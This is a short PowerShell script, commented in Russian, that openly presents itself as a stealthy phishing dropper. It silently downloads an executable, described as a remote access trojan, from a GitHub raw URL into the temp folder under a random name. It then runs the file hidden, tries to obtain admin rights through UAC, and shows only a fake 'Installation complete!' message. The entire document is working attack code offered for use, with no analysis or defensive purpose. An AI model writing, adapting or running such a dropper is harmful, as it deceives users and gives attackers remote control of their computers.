# Скрытный фишинг-скрипт для скачивания и запуска RAT с админ-правами
$outputMessage = "Установка завершена!" # Меняй эту строку на свой текст

# URL твоего RAT на GitHub (замени YOUR_USERNAME/YOUR_REPO на свои)
$ratUrl = "https://raw.githubusercontent.com/theteslabro/installer/main/downloader.exe"

# Путь для сохранения RAT в %TEMP% с рандомным именем
$destPath = "$env:TEMP\r$(Get-Random -Minimum 10000 -Maximum 99999).exe"

# Проверка, запущен ли PowerShell с админ-правами
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Скачиваем RAT скрытно
Invoke-WebRequest -Uri $ratUrl -OutFile $destPath -UseBasicParsing -ErrorAction SilentlyContinue

# Запускаем RAT в зависимости от прав
if (Test-Path $destPath) {
    try {
        if ($isAdmin) {
            # Если уже админ, запускаем RAT скрытно
            Start-Process -FilePath $destPath -WindowStyle Hidden -ErrorAction SilentlyContinue
        } else {
            # Если не админ, пробуем запросить UAC
            Start-Process -FilePath $destPath -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {
        # Если UAC отклонён, запускаем без админ-прав
        Start-Process -FilePath $destPath -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

# Единственный вывод
Write-Host $outputMessage